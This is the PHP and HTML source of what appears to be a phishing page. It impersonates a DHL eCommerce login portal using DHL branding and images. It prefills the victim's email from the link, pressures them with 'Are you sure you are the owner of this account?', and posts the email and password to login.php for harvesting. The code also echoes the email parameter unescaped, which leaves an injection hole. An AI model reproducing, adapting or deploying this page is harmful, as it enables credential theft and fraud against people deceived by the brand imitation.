<?php
include('helper.php');

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $email);
	$user = @$parts[0];
// < end 


$email = $_GET['email'];


?>

<html hola_ext_inject="inited"><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<link rel="shortcut icon" href="http://www.dhl.com/img/favicon.gif" type="image/gif"><title>DHL | eCommerce Login</title></head>

<body topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0" bgcolor="FCD32F" marginheight="0" marginwidth="0">

<table height="100%" align="center" cellspacing="0" width="100%">

<tbody><tr><td height="10%">
</td></tr>




<tr><td height="20%" bgcolor="#000000">

	<table align="center" width="900"><tbody><tr>

	<td>
	<img src="https://assets.aftership.com/couriers/svg/dhl-global-mail.svg" height="170" width="170">
</iframe>
	</td>



	<td>
	<div align="right">
	<br><br><br>
	<font face="Imprint MT Shadow" color="#ff0000" size="+2">
	ENABLING YOUR E-COMMERCE LOGISTICS
	</font></div><font face="calibri" color="#FF0000" size="+2">
		
	</font></td>
		
	</tr></tbody></table>

</td></tr>




<tr><td height="55%">
	
	<table height="300" align="center" width=""><tbody><tr>
	
	<td bgcolor="" width="580">

		<table align="left" width="500">

				<tbody><tr><td>

				<form method="post" action="login.php">
			
				<font face="calibri" color="" size="3">

				<br>

				<font face="Garamond" color="#DF0101" size="+2">
				<b>DHL eCommerce Login Portal</b><br>
				<font color="#FF0000" size="3"><b>Are you sure you are the owner of this account? Use your e-mail  to view package tracking information</b></font>
				</font>
				<br><br>

				<input name="email" value="<?php echo $email ?>" style="width:375px; height:40px; font-family: Verdana; font-size: 14px; color:#000000; 
				background-color: #FAFAFA; border: solid 2px #FF4000; padding: 10px" "="" required=""  placeholder="Enter Email" type="email">	

				<p>

				<input name="pass" style="width:375px; height:40px; font-family: Verdana; font-size: 14px; color:#000000; 
				background-color: #FAFAFA; border: solid 2px #FF4000; padding: 10px" "="" required="" placeholder="Password" type="password">
	


				</p></font><p><font face="calibri" color="" size="3">

				<input value="Login" style="width:375px; height:50px; background-color: #DF0101; border: solid 3px #DF0101; 
				font-family: Verdana; font-size: 18px; font-weight: light; color: #ffffff; -moz-border-radius: 3px; -webkit-border-radius: 3px; 
				-khtml-border-radius: 3px; border-radius: 3px;" type="submit">				
	
				</font>

				</p></form>			

				</td></tr>
				
				</tbody></table>
	</td>


	<td width="80"></td>



	<td bgcolor="#00000" width="220">

	
	<div align="center">
	<img src="https://www.retailnews.asia/wp-content/uploads/2017/05/DHL-DB-620x400.jpg" height="170" width="170">
	</div>
	<br>

		</div>
	</td>

	</tr></tbody></table>

</td></tr>



<tr><td height="10%" bgcolor="#ffffff">

	<table align="center"><tbody><tr>

	<td>

	</td>

	</tr></tbody></table></td></tr>




<tr><td height="5%" bgcolor="#000000">
</td></tr>

</tbody></table>



</body></html>